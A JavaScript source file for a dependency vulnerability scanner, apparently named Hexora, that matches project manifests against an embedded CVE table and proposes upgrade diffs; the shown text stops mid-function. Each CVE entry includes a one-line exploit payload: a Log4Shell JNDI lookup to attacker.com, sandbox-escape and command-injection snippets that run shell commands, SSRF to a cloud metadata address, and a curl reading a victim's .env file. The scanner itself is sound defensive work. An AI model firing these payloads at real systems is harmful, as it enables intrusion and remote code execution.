import fs from 'node:fs';
import path from 'node:path';
/**
 * Embedded Knowledge Base of Critical & High Severity CVEs across Ecosystems
 */
export const KNOWN_DEPENDENCY_CVES = [
    // NPM / Node.js
    {
        id: 'CVE-2021-23337',
        packageName: 'lodash',
        ecosystem: 'npm',
        vulnerableRange: '< 4.17.21',
        fixedVersion: '4.17.21',
        severity: 'HIGH',
        cwe: 'CWE-1321',
        title: 'Prototype Pollution & Command Injection in lodash.template',
        description: 'Lodash versions prior to 4.17.21 are vulnerable to Command Injection via template functions and prototype pollution.',
        exploitPoC: `const _ = require('lodash');\n_.template('', { variable: ')){console.log(process.mainModule.require("child_process").execSync("whoami").toString())}//' })({});`,
        referenceUrl: 'https://nvd.nist.gov/vuln/detail/CVE-2021-23337'
    },
    {
        id: 'CVE-2024-39338',
        packageName: 'axios',
        ecosystem: 'npm',
        vulnerableRange: '< 1.7.4',
        fixedVersion: '1.7.4',
        severity: 'HIGH',
        cwe: 'CWE-918',
        title: 'Server-Side Request Forgery (SSRF) via Axios Absolute URL Bypass',
        description: 'Axios versions prior to 1.7.4 allow Server-Side Request Forgery (SSRF) when combined with an absolute URL path bypass.',
        exploitPoC: `axios.get('///attacker.internal/secret', { baseURL: 'https://api.domain.com' });`,
        referenceUrl: 'https://nvd.nist.gov/vuln/detail/CVE-2024-39338'
    },
    {
        id: 'CVE-2022-23529',
        packageName: 'jsonwebtoken',
        ecosystem: 'npm',
        vulnerableRange: '< 9.0.0',
        fixedVersion: '9.0.0',
        severity: 'CRITICAL',
        cwe: 'CWE-94',
        title: 'Remote Code Execution via jwt.verify in jsonwebtoken',
        description: 'Jsonwebtoken versions prior to 9.0.0 allow arbitrary file write or code execution when verifying tokens with untrusted secretOrPublicKey arguments.',
        exploitPoC: `jwt.verify(token, { toString: () => { require('child_process').execSync('calc'); } });`,
        referenceUrl: 'https://nvd.nist.gov/vuln/detail/CVE-2022-23529'
    },
    {
        id: 'CVE-2024-29041',
        packageName: 'express',
        ecosystem: 'npm',
        vulnerableRange: '< 4.19.2',
        fixedVersion: '4.19.2',
        severity: 'HIGH',
        cwe: 'CWE-601',
        title: 'Open Redirect via Malformed URLs in res.location / res.redirect',
        description: 'Express.js versions prior to 4.19.2 allow open redirect attacks due to improper sanitization in res.location() and res.redirect().',
        exploitPoC: `res.redirect('https://evil.com/\\@legit.com');`,
        referenceUrl: 'https://nvd.nist.gov/vuln/detail/CVE-2024-29041'
    },
    {
        id: 'CVE-2024-28863',
        packageName: 'tar',
        ecosystem: 'npm',
        vulnerableRange: '< 6.2.1',
        fixedVersion: '6.2.1',
        severity: 'CRITICAL',
        cwe: 'CWE-22',
        title: 'Arbitrary File Overwrite & Path Traversal in tar',
        description: 'Node tar versions prior to 6.2.1 are vulnerable to arbitrary file overwrite and directory traversal during unpack.',
        exploitPoC: `tar.x({ file: 'malicious-archive-with-traversal.tar' });`,
        referenceUrl: 'https://nvd.nist.gov/vuln/detail/CVE-2024-28863'
    },
    {
        id: 'CVE-2021-44906',
        packageName: 'minimist',
        ecosystem: 'npm',
        vulnerableRange: '< 1.2.6',
        fixedVersion: '1.2.6',
        severity: 'HIGH',
        cwe: 'CWE-1321',
        title: 'Prototype Pollution in minimist',
        description: 'Minimist prior to 1.2.6 is vulnerable to Prototype Pollution via improper handling of __proto__ keys in argument parsing.',
        exploitPoC: `minimist(['--__proto__.polluted=true']); // Object.prototype.polluted is true`,
        referenceUrl: 'https://nvd.nist.gov/vuln/detail/CVE-2021-44906'
    },
    {
        id: 'CVE-2022-31129',
        packageName: 'moment',
        ecosystem: 'npm',
        vulnerableRange: '< 2.29.4',
        fixedVersion: '2.29.4',
        severity: 'HIGH',
        cwe: 'CWE-1333',
        title: 'Regular Expression Denial of Service (ReDoS) in moment',
        description: 'Moment.js prior to 2.29.4 is vulnerable to ReDoS when parsing crafted user-supplied dates.',
        exploitPoC: `moment('2022-01-01' + ' '.repeat(50000) + 'Z'); // CPU hangs at 100%`,
        referenceUrl: 'https://nvd.nist.gov/vuln/detail/CVE-2022-31129'
    },
    {
        id: 'CVE-2024-37890',
        packageName: 'ws',
        ecosystem: 'npm',
        vulnerableRange: '< 8.17.1',
        fixedVersion: '8.17.1',
        severity: 'HIGH',
        cwe: 'CWE-400',
        title: 'Denial of Service via Unchecked WebSocket Frames in ws',
        description: 'The ws package before 8.17.1 allows a remote attacker to cause an uncaught exception leading to process crash.',
        exploitPoC: `Attacker streams malformed continuous frame fragments causing fatal uncaught error.`,
        referenceUrl: 'https://nvd.nist.gov/vuln/detail/CVE-2024-37890'
    },
    {
        id: 'CVE-2024-47764',
        packageName: 'cookie',
        ecosystem: 'npm',
        vulnerableRange: '< 0.7.0',
        fixedVersion: '0.7.0',
        severity: 'HIGH',
        cwe: 'CWE-1333',
        title: 'Out-of-bounds Read / ReDoS in cookie parser',
        description: 'Cookie prior to 0.7.0 allows remote attackers to trigger quadratic algorithmic complexity during cookie header parsing.',
        exploitPoC: `cookie.parse('foo=' + ' '.repeat(50000) + 'bar');`,
        referenceUrl: 'https://nvd.nist.gov/vuln/detail/CVE-2024-47764'
    },
    {
        id: 'CVE-2024-45811',
        packageName: 'vite',
        ecosystem: 'npm',
        vulnerableRange: '< 5.4.6',
        fixedVersion: '5.4.6',
        severity: 'HIGH',
        cwe: 'CWE-22',
        title: 'Filesystem Deny List Bypass in Vite Dev Server',
        description: 'Vite versions prior to 5.4.6 allow path traversal bypassing server.fs.deny on case-insensitive filesystems like Windows and macOS.',
        exploitPoC: `curl http://localhost:5173/@fs/C:/Users/victim/.env`,
        referenceUrl: 'https://nvd.nist.gov/vuln/detail/CVE-2024-45811'
    },
    {
        id: 'CVE-2024-34351',
        packageName: 'next',
        ecosystem: 'npm',
        vulnerableRange: '< 14.1.1',
        fixedVersion: '14.1.1',
        severity: 'CRITICAL',
        cwe: 'CWE-918',
        title: 'Server-Side Request Forgery in Next.js Server Actions',
        description: 'Next.js before 14.1.1 is vulnerable to Server-Side Request Forgery via Host header poisoning in Server Action redirect handlers.',
        exploitPoC: `POST / HTTP/1.1\nHost: 169.254.169.254\nNext-Action: xxxx`,
        referenceUrl: 'https://nvd.nist.gov/vuln/detail/CVE-2024-34351'
    },
    {
        id: 'CVE-2023-37466',
        packageName: 'vm2',
        ecosystem: 'npm',
        vulnerableRange: '< 999.0.0',
        fixedVersion: 'isolated-vm',
        severity: 'CRITICAL',
        cwe: 'CWE-94',
        title: 'Sandbox Escape and Remote Code Execution in vm2',
        description: 'All versions of vm2 are vulnerable to complete sandbox escape resulting in host Remote Code Execution (deprecated package).',
        exploitPoC: `const { VM } = require('vm2'); new VM().run('Error.prepareStackTrace = (e, frames) => { frames[0].getThis().process.mainModule.require("child_process").execSync("calc"); }; try { null.a; } catch (e) { e.stack; }');`,
        referenceUrl: 'https://nvd.nist.gov/vuln/detail/CVE-2023-37466'
    },
    {
        id: 'CVE-2024-21538',
        packageName: 'cross-spawn',
        ecosystem: 'npm',
        vulnerableRange: '< 7.0.5',
        fixedVersion: '7.0.5',
        severity: 'CRITICAL',
        cwe: 'CWE-78',
        title: 'Command Injection on Windows in cross-spawn',
        description: 'cross-spawn prior to 7.0.5 allows command injection on Windows via improper escaping of batch file arguments.',
        exploitPoC: `spawn('cmd.exe', ['args', '& calc.exe']);`,
        referenceUrl: 'https://nvd.nist.gov/vuln/detail/CVE-2024-21538'
    },
    {
        id: 'CVE-2024-4067',
        packageName: 'micromatch',
        ecosystem: 'npm',
        vulnerableRange: '< 4.0.8',
        fixedVersion: '4.0.8',
        severity: 'MEDIUM',
        cwe: 'CWE-1333',
        title: 'Regular Expression Denial of Service in micromatch',
        description: 'Micromatch prior to 4.0.8 allows attackers to cause catastrophic backtracking via crafted regex globs.',
        exploitPoC: `micromatch.isMatch('a', '*{a,b}*'.repeat(5000));`,
        referenceUrl: 'https://nvd.nist.gov/vuln/detail/CVE-2024-4067'
    },
    // Python / PyPI
    {
        id: 'CVE-2023-32681',
        packageName: 'requests',
        ecosystem: 'pypi',
        vulnerableRange: '< 2.31.0',
        fixedVersion: '2.31.0',
        severity: 'HIGH',
        cwe: 'CWE-200',
        title: 'Unintended Authorization Header Leakage on Cross-Origin Redirect',
        description: 'Requests prior to 2.31.0 forwards the Authorization header during cross-origin HTTPS to HTTP redirects.',
        exploitPoC: `requests.get('https://legit.com/redirect-to-attacker', headers={'Authorization': 'Bearer SECRET'})`,
        referenceUrl: 'https://nvd.nist.gov/vuln/detail/CVE-2023-32681'
    },
    {
        id: 'CVE-2023-45803',
        packageName: 'urllib3',
        ecosystem: 'pypi',
        vulnerableRange: '< 2.0.7',
        fixedVersion: '2.0.7',
        severity: 'HIGH',
        cwe: 'CWE-200',
        title: 'HTTP Request Body Leaked on Cross-Origin Redirect in urllib3',
        description: 'urllib3 prior to 2.0.7 does not strip the HTTP request body when redirecting from HTTPS to HTTP.',
        exploitPoC: `urllib3.PoolManager().request('POST', 'https://origin/redirect', body=b'password=secret')`,
        referenceUrl: 'https://nvd.nist.gov/vuln/detail/CVE-2023-45803'
    },
    {
        id: 'CVE-2023-30861',
        packageName: 'flask',
        ecosystem: 'pypi',
        vulnerableRange: '< 2.2.5',
        fixedVersion: '2.2.5',
        severity: 'HIGH',
        cwe: 'CWE-384',
        title: 'Session Cookie Tampering via Insecure Default Configuration in Flask',
        description: 'Flask versions prior to 2.2.5 permit session fixation or cookie tampering when combined with unsafe cookie settings.',
        exploitPoC: `Attacker intercepts or reuses unsigned session cookie.`,
        referenceUrl: 'https://nvd.nist.gov/vuln/detail/CVE-2023-30861'
    },
    {
        id: 'CVE-2023-46695',
        packageName: 'django',
        ecosystem: 'pypi',
        vulnerableRange: '< 4.2.8',
        fixedVersion: '4.2.8',
        severity: 'HIGH',
        cwe: 'CWE-400',
        title: 'Denial of Service via TruncateWords in Django',
        description: 'Django prior to 4.2.8 is subject to Denial of Service via massive inputs to truncatewords and truncatechars filters.',
        exploitPoC: `django.template.defaultfilters.truncatewords('x' * 10000000, 10)`,
        referenceUrl: 'https://nvd.nist.gov/vuln/detail/CVE-2023-46695'
    },
    {
        id: 'CVE-2023-46136',
        packageName: 'werkzeug',
        ecosystem: 'pypi',
        vulnerableRange: '< 3.0.1',
        fixedVersion: '3.0.1',
        severity: 'HIGH',
        cwe: 'CWE-400',
        title: 'Denial of Service via Multipart Form Parsing in Werkzeug',
        description: 'Werkzeug before 3.0.1 allows remote DoS by sending multipart/form-data requests with very large header blocks.',
        exploitPoC: `POST multipart body with 10,000 headers causing high CPU exhaustion.`,
        referenceUrl: 'https://nvd.nist.gov/vuln/detail/CVE-2023-46136'
    },
    {
        id: 'CVE-2023-50447',
        packageName: 'pillow',
        ecosystem: 'pypi',
        vulnerableRange: '< 10.2.0',
        fixedVersion: '10.2.0',
        severity: 'CRITICAL',
        cwe: 'CWE-94',
        title: 'Arbitrary Code Execution via Environment Injection in Pillow',
        description: 'Pillow prior to 10.2.0 is vulnerable to arbitrary code execution via ImageMath.eval where environment builtins are insufficiently isolated.',
        exploitPoC: `from PIL import ImageMath; ImageMath.eval('exec("import os; os.system(\\'calc\\')")', {})`,
        referenceUrl: 'https://nvd.nist.gov/vuln/detail/CVE-2023-50447'
    },
    {
        id: 'CVE-2023-36258',
        packageName: 'langchain',
        ecosystem: 'pypi',
        vulnerableRange: '< 0.1.0',
        fixedVersion: '0.1.0',
        severity: 'CRITICAL',
        cwe: 'CWE-94',
        title: 'Arbitrary Code Execution in LangChain PALChain & Python REPL',
        description: 'LangChain prior to 0.1.0 allows arbitrary remote code execution via unsafe eval in PALChain and PythonAstREPLTool.',
        exploitPoC: `pal_chain.run("What is __import__('os').system('id')")`,
        referenceUrl: 'https://nvd.nist.gov/vuln/detail/CVE-2023-36258'
    },
    // Rust / Crates.io
    {
        id: 'CVE-2021-45710',
        packageName: 'tokio',
        ecosystem: 'crates',
        vulnerableRange: '< 1.13.1',
        fixedVersion: '1.13.1',
        severity: 'HIGH',
        cwe: 'CWE-362',
        title: 'Race Condition in tokio Named Pipe Handling on Windows',
        description: 'Tokio before 1.13.1 on Windows contains a race condition in named pipes that could allow unauthorized local clients to connect.',
        exploitPoC: `Local attacker hijacks named pipe server connection before legit client.`,
        referenceUrl: 'https://nvd.nist.gov/vuln/detail/CVE-2021-45710'
    },
    // Go
    {
        id: 'CVE-2023-44487',
        packageName: 'golang.org/x/net',
        ecosystem: 'golang',
        vulnerableRange: '< 0.17.0',
        fixedVersion: '0.17.0',
        severity: 'HIGH',
        cwe: 'CWE-400',
        title: 'HTTP/2 Rapid Reset Denial of Service',
        description: 'The HTTP/2 protocol stream cancellation allows a denial of service attack by resetting streams rapidly.',
        exploitPoC: `Stream thousands of HEADERS frames followed immediately by RST_STREAM frames.`,
        referenceUrl: 'https://nvd.nist.gov/vuln/detail/CVE-2023-44487'
    },
    {
        id: 'CVE-2020-28483',
        packageName: 'github.com/gin-gonic/gin',
        ecosystem: 'golang',
        vulnerableRange: '< 1.9.1',
        fixedVersion: '1.9.1',
        severity: 'HIGH',
        cwe: 'CWE-22',
        title: 'Path Traversal via Double Encoded Slashes in Gin',
        description: 'Gin web framework before 1.9.1 allows directory traversal via URL path manipulation.',
        exploitPoC: `GET /static/..%2f..%2fetc/passwd HTTP/1.1`,
        referenceUrl: 'https://nvd.nist.gov/vuln/detail/CVE-2020-28483'
    },
    // Java / Maven
    {
        id: 'CVE-2021-44228',
        packageName: 'log4j-core',
        ecosystem: 'maven',
        vulnerableRange: '< 2.17.1',
        fixedVersion: '2.17.1',
        severity: 'CRITICAL',
        cwe: 'CWE-502',
        title: 'Log4Shell Remote Code Execution via JNDI Lookup',
        description: 'Apache Log4j2 versions 2.0-beta9 to 2.17.0 allow remote code execution via LDAP/RMI JNDI lookups triggered by logged user input.',
        exploitPoC: `\${jndi:ldap://attacker.com/exploit}`,
        referenceUrl: 'https://nvd.nist.gov/vuln/detail/CVE-2021-44228'
    },
    {
        id: 'CVE-2022-22965',
        packageName: 'spring-core',
        ecosystem: 'maven',
        vulnerableRange: '< 5.3.18',
        fixedVersion: '5.3.18',
        severity: 'CRITICAL',
        cwe: 'CWE-94',
        title: 'Spring4Shell Remote Code Execution in Spring Framework',
        description: 'Spring Framework versions before 5.3.18 allow Remote Code Execution via DataBinder parameter binding on JDK 9+.',
        exploitPoC: `POST /app?class.module.classLoader.resources.context.parent.pipeline.first.pattern=...`,
        referenceUrl: 'https://nvd.nist.gov/vuln/detail/CVE-2022-22965'
    },
    // PHP / Packagist
    {
        id: 'CVE-2022-31090',
        packageName: 'guzzlehttp/guzzle',
        ecosystem: 'packagist',
        vulnerableRange: '< 7.4.5',
        fixedVersion: '7.4.5',
        severity: 'HIGH',
        cwe: 'CWE-200',
        title: 'Sensitive Authorization Header Forwarding in Guzzle',
        description: 'Guzzle prior to 7.4.5 inadvertently forwards Authorization headers during redirects to different hosts.',
        exploitPoC: `\$client->request('GET', 'http://legit.com/redirect-to-attacker', ['auth' => ['user', 'pass']]);`,
        referenceUrl: 'https://nvd.nist.gov/vuln/detail/CVE-2022-31090'
    }
];
export class ScaScanner {
    /**
     * Scans a target project for all manifest files and identifies vulnerable dependencies and plugins.
     */
    async scanProject(targetDir) {
        const findings = [];
        const resolvedRoot = path.resolve(targetDir);
        const manifests = this.findManifestFiles(resolvedRoot);
        for (const manifestPath of manifests) {
            try {
                const fileContent = fs.readFileSync(manifestPath, 'utf-8');
                const relPath = path.relative(resolvedRoot, manifestPath).replace(/\\/g, '/');
                const manifestFindings = await this.scanManifestFile(manifestPath, relPath, fileContent);
                for (const mf of manifestFindings) {
                    findings.push(mf);
                }
            }
            catch {
                // Skip unreadable files
            }
        }
        return findings;
    }
    /**
     * Scans a single manifest file content synchronously against local database.
     */
    scanManifestFileSync(fullPath, relPath, content) {
        const findings = [];
        const fileName = path.basename(fullPath).toLowerCase();
        const parsedDeps = [];
        const appendDeps = (deps) => {
            for (const d of deps)
                parsedDeps.push(d);
        };
        if (fileName === 'package.json') {
            appendDeps(this.parsePackageJson(fullPath, relPath, content));
        }
        else if (fileName === 'package-lock.json') {
            appendDeps(this.parsePackageLockJson(fullPath, relPath, content));
        }
        else if (fileName === 'requirements.txt') {
            appendDeps(this.parseRequirementsTxt(fullPath, relPath, content));
        }
        else if (fileName === 'cargo.toml') {
            appendDeps(this.parseCargoToml(fullPath, relPath, content));
        }
        else if (fileName === 'go.mod') {
            appendDeps(this.parseGoMod(fullPath, relPath, content));
        }
        else if (fileName === 'pom.xml') {
            appendDeps(this.parsePomXml(fullPath, relPath, content));
        }
        else if (fileName === 'composer.json') {
            appendDeps(this.parseComposerJson(fullPath, relPath, content));
        }
        for (const dep of parsedDeps) {
            const matches = KNOWN_DEPENDENCY_CVES.filter((cve) => cve.packageName.toLowerCase() === dep.name.toLowerCase() && cve.ecosystem === dep.ecosystem);
            for (const match of matches) {
                if (this.isVersionVulnerable(dep.cleanVersion, match.vulnerableRange)) {
                    findings.push(this.createFinding(dep, match, content));
                }
            }
        }
        return findings;
    }
    /**
     * Scans a single manifest file content.
     */
    async scanManifestFile(fullPath, relPath, content) {
        const findings = this.scanManifestFileSync(fullPath, relPath, content);
        const fileName = path.basename(fullPath).toLowerCase();
        const parsedDeps = [];
        const appendDeps = (deps) => {
            for (const d of deps)
                parsedDeps.push(d);
        };
        if (fileName === 'package.json') {
            appendDeps(this.parsePackageJson(fullPath, relPath, content));
        }
        else if (fileName === 'package-lock.json') {
            appendDeps(this.parsePackageLockJson(fullPath, relPath, content));
        }
        else if (fileName === 'requirements.txt') {
            appendDeps(this.parseRequirementsTxt(fullPath, relPath, content));
        }
        else if (fileName === 'cargo.toml') {
            appendDeps(this.parseCargoToml(fullPath, relPath, content));
        }
        else if (fileName === 'go.mod') {
            appendDeps(this.parseGoMod(fullPath, relPath, content));
        }
        else if (fileName === 'pom.xml') {
            appendDeps(this.parsePomXml(fullPath, relPath, content));
        }
        else if (fileName === 'composer.json') {
            appendDeps(this.parseComposerJson(fullPath, relPath, content));
        }
        // Dynamic Online OSV Query fallback (with fast timeout)
        if (process.env.HEXORA_ONLINE_SCA === 'true') {
            for (const dep of parsedDeps) {
                const alreadyFound = findings.some((f) => f.location.snippet.includes(dep.name));
                if (!alreadyFound) {
                    const liveCve = await this.queryOsvApi(dep);
                    if (liveCve) {
                        findings.push(this.createFinding(dep, liveCve, content));
                    }
                }
            }
        }
        return findings;
    }
    /**
     * Parses package.json dependencies
     */
    parsePackageJson(fullPath, relPath, content) {
        const deps = [];
        try {
            const json = JSON.parse(content);
            const allDeps = {
                ...json.dependencies,
                ...json.devDependencies,
                ...json.peerDependencies,
                ...json.optionalDependencies
            };
            const lines = content.split('\n');
            for (const [name, rawVersionVal] of Object.entries(allDeps)) {
                const rawVer = String(rawVersionVal).trim();
                const cleanVer = this.cleanVersionString(rawVer);
                // Find line number in file
                let lineIdx = lines.findIndex((l) => l.includes(`"${name}"`));
                if (lineIdx === -1)
                    lineIdx = 0;
                deps.push({
                    name,
                    rawVersion: rawVer,
                    cleanVersion: cleanVer,
                    line: lineIdx + 1,
                    filePath: relPath,
                    ecosystem: 'npm'
                });
            }
        }
        catch { }
        return deps;
    }
    /**
     * Parses package-lock.json packages
     */
    parsePackageLockJson(fullPath, relPath, content) {
        const deps = [];
        try {
            const json = JSON.parse(content);
            const lines = content.split('\n');
            if (json.packages) {
                for (const [pkgPath, meta] of Object.entries(json.packages)) {
                    if (!pkgPath || !meta.version)
                        continue;
                    const pkgName = pkgPath.replace(/^node_modules\//, '');
                    const cleanVer = this.cleanVersionString(meta.version);
                    let lineIdx = lines.findIndex((l) => l.includes(`"${pkgPath}"`));
                    if (lineIdx === -1)
                        lineIdx = 0;
                    deps.push({
                        name: pkgName,
                        rawVersion: meta.version,
                        cleanVersion: cleanVer,
                        line: lineIdx + 1,
                        filePath: relPath,
                        ecosystem: 'npm'
                    });
                }
            }
        }
        catch { }
        return deps;
    }
    /**
     * Parses requirements.txt for Python
     */
    parseRequirementsTxt(fullPath, relPath, content) {
        const deps = [];
        const lines = content.split('\n');
        lines.forEach((line, idx) => {
            const trimmed = line.trim();
            if (!trimmed || trimmed.startsWith('#'))
                return;
            const match = trimmed.match(/^([a-zA-Z0-9_\-\.]+)\s*(?:==|<=|>=|~=|<|>)?\s*([0-9a-zA-Z_\.\-]+)?/);
            if (match) {
                const name = match[1];
                const rawVer = match[2] || '0.0.0';
                const cleanVer = this.cleanVersionString(rawVer);
                deps.push({
                    name,
                    rawVersion: rawVer,
                    cleanVersion: cleanVer,
                    line: idx + 1,
                    filePath: relPath,
                    ecosystem: 'pypi'
                });
            }
        });
        return deps;
    }
    /**
     * Parses Cargo.toml for Rust
     */
    parseCargoToml(fullPath, relPath, content) {
        const deps = [];
        const lines = content.split('\n');
        let inDeps = false;
        lines.forEach((line, idx) => {
            const trimmed = line.trim();
            if (trimmed.startsWith('[dependencies]') || trimmed.startsWith('[dev-dependencies]')) {
                inDeps = true;
                return;
            }
            else if (trimmed.startsWith('[') && inDeps) {
                inDeps = false;
                return;
            }
            if (inDeps && trimmed && !trimmed.startsWith('#')) {
                const match = trimmed.match(/^([a-zA-Z0-9_\-]+)\s*=\s*(?:\{[^}]*version\s*=\s*['"]([^'"]+)['"]|['"]([^'"]+)['"])/);
                if (match) {
                    const name = match[1];
                    const rawVer = match[2] || match[3] || '0.0.0';
                    deps.push({
                        name,
                        rawVersion: rawVer,
                        cleanVersion: this.cleanVersionString(rawVer),
                        line: idx + 1,
                        filePath: relPath,
                        ecosystem: 'crates'
                    });
                }
            }
        });
        return deps;
    }
    /**
     * Parses go.mod for Golang
     */
    parseGoMod(fullPath, relPath, content) {
        const deps = [];
        const lines = content.split('\n');
        lines.forEach((line, idx) => {
            const trimmed = line.trim();
            const match = trimmed.match(/(?:require\s+)?([a-zA-Z0-9_\.\-\/]+)\s+v?([0-9a-zA-Z\.\-]+)/);
            if (match && !trimmed.startsWith('//') && !trimmed.startsWith('module') && !trimmed.startsWith('go ')) {
                deps.push({
                    name: match[1],
                    rawVersion: match[2],
                    cleanVersion: this.cleanVersionString(match[2]),
                    line: idx + 1,
                    filePath: relPath,
                    ecosystem: 'golang'
                });
            }
        });
        return deps;
    }
    /**
     * Parses pom.xml for Java Maven
     */
    parsePomXml(fullPath, relPath, content) {
        const deps = [];
        const artifactRegex = /<artifactId>([^<]+)<\/artifactId>[\s\S]*?<version>([^<]+)<\/version>/g;
        let match;
        while ((match = artifactRegex.exec(content)) !== null) {
            const name = match[1].trim();
            const rawVer = match[2].trim();
            const linesBefore = content.substring(0, match.index).split('\n');
            deps.push({
                name,
                rawVersion: rawVer,
                cleanVersion: this.cleanVersionString(rawVer),
                line: linesBefore.length,
                filePath: relPath,
                ecosystem: 'maven'
            });
        }
        return deps;
    }
    /**
     * Parses composer.json for PHP
     */
    parseComposerJson(fullPath, relPath, content) {
        const deps = [];
        try {
            const json = JSON.parse(content);
            const all = { ...json.require, ...json['require-dev'] };
            const lines = content.split('\n');
            for (const [name, ver] of Object.entries(all)) {
                let lineIdx = lines.findIndex((l) => l.includes(`"${name}"`));
                if (lineIdx === -1)
                    lineIdx = 0;
                deps.push({
                    name,
                    rawVersion: String(ver),
                    cleanVersion: this.cleanVersionString(String(ver)),
                    line: lineIdx + 1,
                    filePath: relPath,
                    ecosystem: 'packagist'
                });
            }
        }
        catch { }
        return deps;
    }
    /**
     * Cleans versions like ^1.2.3, ~2.3.4, >=1.0.0 to pure numeric semver (e.g. 1.2.3)
     */
    cleanVersionString(ver) {
        const match = ver.match(/([0-9]+(?:\.[0-9]+)*(?:-[a-zA-Z0-9\.]*)?)/);
        return match ? match[1] : '0.0.0';
    }
    /**
     * Evaluates if a version falls within a vulnerable range (e.g. "< 4.17.21")
     */
    isVersionVulnerable(currentVer, vulnerableRange) {
        const parts = vulnerableRange.split(',').map((s) => s.trim());
        for (const part of parts) {
            if (part.startsWith('<=')) {
                const target = part.slice(2).trim();
                if (this.compareVersions(currentVer, target) > 0)
                    return false;
            }
            else if (part.startsWith('<')) {
                const target = part.slice(1).trim();
                if (this.compareVersions(currentVer, target) >= 0)
                    return false;
            }
            else if (part.startsWith('>=')) {
                const target = part.slice(2).trim();
                if (this.compareVersions(currentVer, target) < 0)
                    return false;
            }
            else if (part.startsWith('>')) {
                const target = part.slice(1).trim();
                if (this.compareVersions(currentVer, target) <= 0)
                    return false;
            }
            else if (part.startsWith('=')) {
                const target = part.replace(/^=+/, '').trim();
                if (this.compareVersions(currentVer, target) !== 0)
                    return false;
            }
        }
        return true;
    }
    /**
     * Semver numeric comparison (returns -1 if v1 < v2, 0 if v1 === v2, 1 if v1 > v2)
     */
    compareVersions(v1, v2) {
        const nums1 = v1.split('.').map((x) => parseInt(x, 10) || 0);
        const nums2 = v2.split('.').map((x) => parseInt(x, 10) || 0);
        const maxLen = Math.max(nums1.length, nums2.length);
        for (let i = 0; i < maxLen; i++) {
            const n1 = nums1[i] || 0;
            const n2 = nums2[i] || 0;
            if (n1 > n2)
                return 1;
            if (n1 < n2)
                return -1;
        }
        return 0;
    }
    /**
     * Constructs a full confirmed VulnerabilityFinding
     */
    createFinding(dep, vuln, fileContent) {
        const lines = fileContent.split('\n');
        const snippetLine = lines[dep.line - 1] || `${dep.name}: ${dep.rawVersion}`;
        // Create unified git patch diff
        const fixedLine = snippetLine.replace(dep.rawVersion, `^${vuln.fixedVersion}`);
        const unifiedDiff = [
            `--- a/${dep.filePath}`,
            `+++ b/${dep.filePath}`,
            `@@ -${dep.line},1 +${dep.line},1 @@`,
            `-${snippetLine}`,
            `+${fixedLine}`
        ].join('\n');
        return {
            id: `SCA-${vuln.id}-${dep.name}`,
            ruleId: `HEXORA-SCA-${vuln.id}`,
            title: `Vulnerable Dependency: ${dep.name}@${dep.rawVersion} (${vuln.id})`,
            severity: vuln.severity,
            category: 'DEPENDENCY',
            cwe: vuln.cwe,
            owasp: 'A06:2021-Vulnerable and Outdated Components',
            location: {
                filePath: dep.filePath,
                lineStart: dep.line,
                lineEnd: dep.line,
                snippet: snippetLine.trim()
            },
            description: `${vuln.title}: ${vuln.description} (Affected: ${vuln.vulnerableRange}, Safe: >= ${vuln.fixedVersion})`,
            status: 'CONFIRMED',
            adversarialVerification: {
                verifier: 'Hexora-SCA-Engine',
                verdict: 'CONFIRMED',
                argument: `Dependency "${dep.name}@${dep.rawVersion}" satisfies vulnerable condition (${vuln.vulnerableRange}) for known CVE ${vuln.id}.`,
                confidence: 1.0
            },
            reproductionPoC: vuln.exploitPoC,
            remediation: {
                explanation: `Upgrade dependency "${dep.name}" from ${dep.rawVersion} to >= ${vuln.fixedVersion} to resolve ${vuln.id}.`,
                replacementCode: fixedLine.trim(),
                unifiedDiff
            },
            timestamp: new Date().toISOString()
        };
    }
    /**
     * Fast query to Google's Open Source Vulnerabilities (OSV) API for Zero-Day CVEs
     */
    async queryOsvApi(dep) {
        try {
            const osvEcosystemMap = {
                npm: 'npm',
                pypi: 'PyPI',
                crates: 'crates.io',
                golang: 'Go',
                maven: 'Maven',
                packagist: 'Packagist'
            };
            const res = await fetch('https://api.osv.dev/v1/query', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    package: { name: dep.name, ecosystem: osvEcosystemMap[dep.ecosystem] || dep.ecosystem },
                    version: dep.cleanVersion
                }),
                signal: AbortSignal.timeout(1500)
            });
            if (!res.ok)
                return null;
            const data = await res.json();
            if (data && data.vulns && data.vulns.length > 0) {
                const topVuln = data.vulns[0];
                const fixedVer = topVuln.affected?.[0]?.ranges?.[0]?.events?.find((e) => e.fixed)?.fixed || 'latest';
                return {
                    id: topVuln.id || 'CVE-ZERO-DAY',
                    packageName: dep.name,
                    ecosystem: dep.ecosystem,
                    vulnerableRange: `<= ${dep.cleanVersion}`,
                    fixedVersion: fixedVer,
                    severity: 'HIGH',
                    cwe: 'CWE-1395',
                    title: topVuln.summary || `Live CVE advisory for ${dep.name}`,
                    description: topVuln.details || `Identified via OSV live advisory database.`,
                    referenceUrl: `https://osv.dev/vulnerability/${topVuln.id}`
                };
            }
        }
        catch {
            // Offline or network timeout - gracefully ignored
        }
        return null;
    }
    /**
     * Discovers all supported manifest files in the directory iteratively and safely
     */
    findManifestFiles(dir) {
        const results = [];
        if (!fs.existsSync(dir))
            return results;
        const manifests = new Set([
            'package.json',
            'package-lock.json',
            'requirements.txt',
            'cargo.toml',
            'go.mod',
            'pom.xml',
            'composer.json'
        ]);
        const ignoreDirs = new Set([
            'node_modules',
            '.git',
            'dist',
            'build',
            'out',
            '.hexora-results',
            '.aevum-audit-results',
            'coverage',
            '.benchmark_workspace',
            'AppData',
            '.cache',
            '.local',
            '.vscode',
            '.idea'
        ]);
        const visitedRealPaths = new Set();
        const stack = [{ dirPath: path.resolve(dir), depth: 0 }];
        const maxDepth = 25;
        const maxManifests = 1000;
        try {
            const initialReal = fs.realpathSync(dir);
            visitedRealPaths.add(initialReal);
        }
        catch { }
        while (stack.length > 0) {
            if (results.length >= maxManifests)
                break;
            const current = stack.pop();
            if (current.depth > maxDepth)
                continue;
            let entries;
            try {
                entries = fs.readdirSync(current.dirPath, { withFileTypes: true });
            }
            catch {
                continue;
            }
            for (const entry of entries) {
                const name = entry.name;
                if (ignoreDirs.has(name) || name.startsWith('.') || name.startsWith('~')) {
                    continue;
                }
                const full = path.join(current.dirPath, name);
                let isDir = false;
                let isFile = false;
                try {
                    if (entry.isSymbolicLink()) {
                        const real = fs.realpathSync(full);
                        if (visitedRealPaths.has(real))
                            continue;
                        visitedRealPaths.add(real);
                        const stat = fs.statSync(full);
                        isDir = stat.isDirectory();
                        isFile = stat.isFile();
                    }
                    else {
                        isDir = entry.isDirectory();
